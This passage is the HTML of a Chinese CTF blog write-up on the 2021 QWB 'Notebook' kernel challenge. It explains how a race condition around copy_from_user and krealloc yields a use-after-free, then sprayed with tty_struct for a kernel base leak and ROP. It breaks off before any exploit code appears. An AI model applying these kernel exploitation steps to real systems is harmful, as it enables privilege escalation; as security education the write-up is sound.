@@ -1,0 +1,568 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width">
+<meta name="theme-color" content="#222"><meta name="generator" content="Hexo 7.1.1">
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/logo_180_180.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/logo_32_32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/logo_16_16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" integrity="sha256-wiz7ZSCn/btzhjKDQBms9Hx4sSeUYsDrTLg7roPstac=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.1.1/animate.min.css" integrity="sha256-PR7ttpcvz8qrF57fur/yAx1qXMFJeJFiA6pSzWi0OIE=" crossorigin="anonymous">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/fancyapps-ui/5.0.33/fancybox/fancybox.css" integrity="sha256-gkQVf8UKZgQ0HyuxL/VnacadJ+D2Kox2TCEBuNQg5+w=" crossorigin="anonymous">
+
+<script class="next-config" data-name="main" type="application/json">{"hostname":"blog.imv1.me","root":"/","images":"/images","scheme":"Mist","darkmode":false,"version":"8.19.1","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12},"copycode":{"enable":true,"style":"mac"},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":true,"pangu":true,"comments":{"style":"tabs","active":"valine","storage":true,"lazyload":true,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false}}</script><script src="/js/config.js"></script>
+
+    <meta name="description" content="强网杯的时候 will 和 SYH 在做这个题，比赛结束之后 will 做出来了。will 想拉个人帮他复现一下 wp，于是我被迫接受了这个任务。看了其他队伍的 exp 之后，只能感叹长亭的师傅太强了。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="从强网杯 Notebook 看内核条件竞争">
+<meta property="og:url" content="http://blog.imv1.me/2021/07/01/qwb2021-notebook-kernel-race-condition.md/">
+<meta property="og:site_name" content="V1me&#39;s Blog">
+<meta property="og:description" content="强网杯的时候 will 和 SYH 在做这个题，比赛结束之后 will 做出来了。will 想拉个人帮他复现一下 wp，于是我被迫接受了这个任务。看了其他队伍的 exp 之后，只能感叹长亭的师傅太强了。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1624709816/blog/Snipaste_2021-06-26_20-16-22_ldjmzs.png">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1624709887/blog/Snipaste_2021-06-26_20-17-12_dyeeuh.png">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1624709995/blog/Snipaste_2021-06-26_20-19-25_mefxup.png">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1624711290/blog/Snipaste_2021-06-26_20-41-00_emkc7r.png">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1624711405/blog/Snipaste_2021-06-26_20-42-56_dblmng.png">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1624711497/blog/Snipaste_2021-06-26_20-44-31_nabyue.png">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1624887422/blog/Snipaste_2021-06-28_21-36-21_irzlpd.png">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1624903037/blog/Snipaste_2021-06-29_01-42-22_q4rorh.png">
+<meta property="og:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1624906988/blog/Snipaste_2021-06-29_03-02-23_bhuzsy.png">
+<meta property="article:published_time" content="2021-06-30T17:44:38.000Z">
+<meta property="article:modified_time" content="2024-02-28T06:02:00.000Z">
+<meta property="article:author" content="V1me">
+<meta property="article:tag" content="ctf">
+<meta property="article:tag" content="pwn">
+<meta property="article:tag" content="kernel">
+<meta property="article:tag" content="linux">
+<meta property="article:tag" content="race condition">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://res.cloudinary.com/v1mecn/image/upload/v1624709816/blog/Snipaste_2021-06-26_20-16-22_ldjmzs.png">
+
+
+<link rel="canonical" href="http://blog.imv1.me/2021/07/01/qwb2021-notebook-kernel-race-condition.md/">
+
+
+
+<script class="next-config" data-name="page" type="application/json">{"sidebar":"","isHome":false,"isPost":true,"lang":"zh-CN","comments":true,"permalink":"http://blog.imv1.me/2021/07/01/qwb2021-notebook-kernel-race-condition.md/","path":"2021/07/01/qwb2021-notebook-kernel-race-condition.md/","title":"从强网杯 Notebook 看内核条件竞争"}</script>
+
+<script class="next-config" data-name="calendar" type="application/json">""</script>
+<title>从强网杯 Notebook 看内核条件竞争 | V1me's Blog</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+    <link rel="stylesheet" href="/css/noscript.css">
+  </noscript>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <div class="column">
+      <header class="header" itemscope itemtype="http://schema.org/WPHeader"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏" role="button">
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <p class="site-title">V1me's Blog</p>
+      <i class="logo-line"></i>
+    </a>
+      <p class="site-subtitle" itemprop="description">Talk is cheap, better to sleep.</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger" aria-label="搜索" role="button">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup"><div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off" maxlength="80"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close" role="button">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div class="search-result-container no-result">
+  <div class="search-result-icon">
+    <i class="fa fa-spinner fa-pulse fa-5x"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</header>
+        
+  
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          文章目录
+        </li>
+        <li class="sidebar-nav-overview">
+          站点概览
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <div class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x00-%E9%80%86%E5%90%91%E5%88%86%E6%9E%90"><span class="nav-number">1.</span> <span class="nav-text">0x00 逆向分析</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#noteadd"><span class="nav-number">1.0.0.1.</span> <span class="nav-text">noteadd</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#notedel"><span class="nav-number">1.0.0.2.</span> <span class="nav-text">notedel</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#noteedit"><span class="nav-number">1.0.0.3.</span> <span class="nav-text">noteedit</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#notegift"><span class="nav-number">1.0.0.4.</span> <span class="nav-text">notegift</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#mynote-read"><span class="nav-number">1.0.0.5.</span> <span class="nav-text">mynote_read</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#mynote-write"><span class="nav-number">1.0.0.6.</span> <span class="nav-text">mynote_write</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01-Race-Condition"><span class="nav-number">2.</span> <span class="nav-text">0x01 Race Condition</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02-%E5%88%A9%E7%94%A8"><span class="nav-number">3.</span> <span class="nav-text">0x02 利用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#exp1"><span class="nav-number">3.1.</span> <span class="nav-text">exp1</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp2"><span class="nav-number">3.2.</span> <span class="nav-text">exp2</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp3"><span class="nav-number">3.3.</span> <span class="nav-text">exp3</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#exp4"><span class="nav-number">3.4.</span> <span class="nav-text">exp4</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03-%E5%9D%91%E7%82%B9"><span class="nav-number">4.</span> <span class="nav-text">0x03 坑点</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#userfaultfd"><span class="nav-number">4.1.</span> <span class="nav-text">userfaultfd</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#tty-struct"><span class="nav-number">4.2.</span> <span class="nav-text">tty_struct</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ONE-gadget-to-TWO-gadget"><span class="nav-number">4.3.</span> <span class="nav-text">ONE gadget to TWO gadget</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#work-for-cpu-fn"><span class="nav-number">4.4.</span> <span class="nav-text">work_for_cpu_fn</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Freelist-Harden"><span class="nav-number">4.5.</span> <span class="nav-text">Freelist Harden</span></a></li></ol></li></ol></div>
+        </div>
+        <!--/noindex-->
+
+        <div class="site-overview-wrap sidebar-panel">
+          <div class="site-author animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="V1me"
+      src="/images/logo_ai_brown.png">
+  <p class="site-author-name" itemprop="name">V1me</p>
+  <div class="site-description" itemprop="description">Work in the dark to serve the light. Nothing is true, everything is permitted.</div>
+</div>
+<div class="site-state-wrap animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+        <a href="/archives/">
+          <span class="site-state-item-count">22</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+          <a href="/categories/">
+        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+          <a href="/tags/">
+        <span class="site-state-item-count">19</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author animated">
+      <span class="links-of-author-item">
+        <a href="https://github.com/Roarcannotprogramming" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;Roarcannotprogramming" rel="noopener me" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="mailto:z1991998920@gmail.com" title="E-Mail → mailto:z1991998920@gmail.com" rel="noopener me" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://twitter.com/RoarCantProgram" title="Twitter → https:&#x2F;&#x2F;twitter.com&#x2F;RoarCantProgram" rel="noopener me" target="_blank"><i class="fab fa-twitter fa-fw"></i>Twitter</a>
+      </span>
+  </div>
+  <div class="cc-license animated" itemprop="license">
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" class="cc-opacity" rel="noopener" target="_blank"><img src="https://cdnjs.cloudflare.com/ajax/libs/creativecommons-vocabulary/2020.11.3/assets/license_badges/small/by_nc_sa.svg" alt="Creative Commons"></a>
+  </div>
+
+        </div>
+      </div>
+    </div>
+
+    
+    <div class="sidebar-inner sidebar-blogroll">
+      <div class="links-of-blogroll animated">
+        <div class="links-of-blogroll-title"><i class="fa fa-globe fa-fw"></i>
+          链接
+        </div>
+        <ul class="links-of-blogroll-list">
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.ertuil.top/" title="https:&#x2F;&#x2F;blog.ertuil.top" rel="noopener" target="_blank">Ertuilの博客</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.wh98.me/" title="https:&#x2F;&#x2F;blog.wh98.me" rel="noopener" target="_blank">Hustcw's Blog</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://sqrt-1.me/" title="https:&#x2F;&#x2F;sqrt-1.me" rel="noopener" target="_blank">负一の平方根的博客</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://sirius1242.github.io/" title="https:&#x2F;&#x2F;sirius1242.github.io" rel="noopener" target="_blank">Sirius's Home</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.volltin.com/" title="https:&#x2F;&#x2F;blog.volltin.com" rel="noopener" target="_blank">Volltin's Blog</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://blog.taoky.moe/" title="https:&#x2F;&#x2F;blog.taoky.moe" rel="noopener" target="_blank">Taoky's Blog</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://ibugone.com/" title="https:&#x2F;&#x2F;ibugone.com" rel="noopener" target="_blank">iBug's Home</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://ksqsf.moe/" title="https:&#x2F;&#x2F;ksqsf.moe" rel="noopener" target="_blank">ksqsf's Home</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="http://0xcc.me/" title="http:&#x2F;&#x2F;0xcc.me" rel="noopener" target="_blank">枸杞蒲蒻的博客</a>
+            </li>
+            <li class="links-of-blogroll-item">
+              <a href="https://0x01.me/" title="https:&#x2F;&#x2F;0x01.me" rel="noopener" target="_blank">Hypercube's Home</a>
+            </li>
+        </ul>
+      </div>
+    </div>
+  </aside>
+
+
+    </div>
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://blog.imv1.me/2021/07/01/qwb2021-notebook-kernel-race-condition.md/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/logo_ai_brown.png">
+      <meta itemprop="name" content="V1me">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="V1me's Blog">
+      <meta itemprop="description" content="Work in the dark to serve the light. Nothing is true, everything is permitted.">
+    </span>
+
+    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
+      <meta itemprop="name" content="从强网杯 Notebook 看内核条件竞争 | V1me's Blog">
+      <meta itemprop="description" content="强网杯的时候 will 和 SYH 在做这个题，比赛结束之后 will 做出来了。will 想拉个人帮他复现一下 wp，于是我被迫接受了这个任务。看了其他队伍的 exp 之后，只能感叹长亭的师傅太强了。">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          从强网杯 Notebook 看内核条件竞争
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">发表于</span>
+
+      <time title="创建时间：2021-07-01 01:44:38" itemprop="dateCreated datePublished" datetime="2021-07-01T01:44:38+08:00">2021-07-01</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">更新于</span>
+      <time title="修改时间：2024-02-28 14:02:00" itemprop="dateModified" datetime="2024-02-28T14:02:00+08:00">2024-02-28</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">分类于</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+            <div class="post-description">强网杯的时候 will 和 SYH 在做这个题，比赛结束之后 will 做出来了。will 想拉个人帮他复现一下 wp，于是我被迫接受了这个任务。看了其他队伍的 exp 之后，只能感叹长亭的师傅太强了。</div>
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody"><h3 id="0x00-逆向分析"><a href="#0x00-逆向分析" class="headerlink" title="0x00 逆向分析"></a>0x00 逆向分析</h3><p>​	题目给了有漏洞的内核模块 <code>notebook.ko</code>，内核保护 KASLR、SMAP、SMEP、KPTI 全开。</p>
+<p>​	<code>notebook.ko</code> 给了 4 个功能 <code>noteadd</code>、<code>notedel</code>、<code>noteedit</code>、<code>notegift</code>，加上读写 <code>mynote_read</code>、<code>mynote_write</code> 一共 6 种操作。</p>
+<h6 id="noteadd"><a href="#noteadd" class="headerlink" title="noteadd"></a>noteadd</h6><p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1624709816/blog/Snipaste_2021-06-26_20-16-22_ldjmzs.png"></p>
+<h6 id="notedel"><a href="#notedel" class="headerlink" title="notedel"></a>notedel</h6><p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1624709887/blog/Snipaste_2021-06-26_20-17-12_dyeeuh.png"></p>
+<h6 id="noteedit"><a href="#noteedit" class="headerlink" title="noteedit"></a>noteedit</h6><p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1624709995/blog/Snipaste_2021-06-26_20-19-25_mefxup.png"></p>
+<h6 id="notegift"><a href="#notegift" class="headerlink" title="notegift"></a>notegift</h6><p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1624711290/blog/Snipaste_2021-06-26_20-41-00_emkc7r.png"></p>
+<h6 id="mynote-read"><a href="#mynote-read" class="headerlink" title="mynote_read"></a>mynote_read</h6><p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1624711405/blog/Snipaste_2021-06-26_20-42-56_dblmng.png"></p>
+<h6 id="mynote-write"><a href="#mynote-write" class="headerlink" title="mynote_write"></a>mynote_write</h6><p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1624711497/blog/Snipaste_2021-06-26_20-44-31_nabyue.png"></p>
+<p>​	乍看之下好像没什么明显的溢出漏洞，但是 lock 操作显得有些突兀。Google 一下 <code>lock</code> 和 <code>copy_from/to_user</code> 发现 <code>copy_from/to_user</code> 可能引发缺页中断（从而导致进程调度），不能在自旋锁的临界区使用。</p>
+<p>​	所以可能就有这样一条链来通过条件竞争来构造:</p>
+<ol>
+<li><p>通过 <code>noteadd</code> 分配一个 0x20 大小的 slub 块。</p>
+</li>
+<li><p>再次执行 <code>noteadd</code> ，size 为 0x60，不过这次我们在 <code>copy_from_user</code> 时让他卡住。这样在<code>mynote_write</code> 的时候就能向我们第一次分配的 0x20 的块内写入 0x60 的数据。</p>
+<p>但是实际情况是 <code>raw_read_lock</code> 没有办法构造我们希望的死锁。需要另想办法。</p>
+</li>
+</ol>
+<h3 id="0x01-Race-Condition"><a href="#0x01-Race-Condition" class="headerlink" title="0x01 Race Condition"></a>0x01 Race Condition</h3><p>​	看到题目给的 qemu 的启动命令，是有 <code>-smp cores=2,threads=2</code> 的。所以考虑利用 <code>copy_from_user</code> 导致的缺页中断来条件竞争。<code>userfaultfd</code> 可以很好的劫持掉缺页的处理，也可以用风水式的硬竞争来爆这个竞争窗口 (will 解法)。</p>
+<p>​	在 <code>noteedit</code> 函数中，<code>krealloc</code> 把原来的块 <code>kfree</code> 掉并分配一个新块。如果在 <code>copy_from_user</code> 断下来，<code>notebook-&gt;note</code> 还没来得及更新，就产生了一个可以利用的 UAF 了。常规的解法思路就是利用这个 UAF 去喷 <code>tty_struct</code>。</p>
+<h3 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h3><p>​	这里介绍四种利用姿势，分别是队里 will 师傅的解法、X1cT34m 战队的解法、L-team 战队的解法、长亭师傅的解法。除了 X1cT34m 外，其他的三种解法思路都一样，只是竞争获取 UAF 的方式有差别。</p>
+<p>​	这里只放上 will 的 exp，L-team 战队 exp 见 <a target="_blank" rel="noopener" href="https://eqqie.cn/index.php/laji_note/1662/">[强网杯2021-线上赛] Pwn方向writeup By L-team</a>，长亭师傅的 exp 见 <a target="_blank" rel="noopener" href="https://www.chainnews.com/articles/777744778306.htm">第五届强网杯线上赛冠军队 WriteUp - Pwn 篇</a>，X1cT34m 的 exp 见 <a target="_blank" rel="noopener" href="https://ctf.njupt.edu.cn/627.html">强网杯2021 Writeup by X1cT34m</a>。</p>
+<h4 id="exp1"><a href="#exp1" class="headerlink" title="exp1"></a>exp1</h4><p>​	分步骤解析一下 will 的利用:</p>
+<ol>
+<li><p>通过很多次抢占竞争窗口，获得 <code>notebook</code> 上两个一样的 <code>note</code> 地址。</p>
+<p><img data-src="https://res.cloudinary.com/v1mecn/image/upload/v1624887422/blog/Snipaste_2021-06-28_21-36-21_irzlpd.png"></p>
+</li>
+<li><p><code>free</code> 掉其中一个 <code>note</code> 产生 UAF，并用 <code>tty_struct</code> 来喷射这个被 <code>free</code> 的 slub 块。</p>
+</li>
+<li><p>通过 <code>tty_struct</code> 中的虚表地址泄露内核基地址，然后劫持虚表，进行内核 ROP。</p>
+</li>
+</ol>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span 